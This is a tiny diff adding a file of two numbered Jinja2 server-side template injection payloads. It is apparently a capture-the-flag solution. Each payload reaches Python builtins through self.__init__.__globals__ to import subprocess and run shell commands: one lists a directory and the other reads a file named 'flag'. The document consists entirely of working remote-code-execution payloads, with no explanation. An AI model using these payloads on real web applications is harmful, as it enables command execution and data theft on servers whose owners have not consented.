@@ -1,0 +1,2 @@
+1. {{ self.__init__.__globals__.__builtins__.__import__('subprocess').run(["ls", "-l"], capture_output=True, text=True)}}
+2. {{ self.__init__.__globals__.__builtins__.__import__('subprocess').run(["cat", "flag"], capture_output=True, text=True)}}
